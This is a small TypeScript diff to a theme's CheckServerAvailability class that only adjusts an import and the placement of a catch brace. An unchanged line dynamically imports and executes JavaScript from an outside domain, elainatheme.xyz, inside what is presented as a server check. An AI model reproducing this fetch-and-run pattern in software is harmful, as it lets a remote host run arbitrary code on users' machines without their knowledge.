@@ -1,4 +1,4 @@
-import { log } from '../utils/themeLog';
+import { log, error } from '../utils/themeLog';
 
 export class CheckServerAvailability {
     main = async () => {
@@ -11,7 +11,8 @@ export class CheckServerAvailability {
             const { count } = await response.json();
             log('Number of users:', count);
             const { default: serverModule } = await import('https://elainatheme.xyz/index.js');
-        } catch (err: any) {
+        } 
+        catch (err: any) {
             clearTimeout(timeoutId);
             throw err;
         }
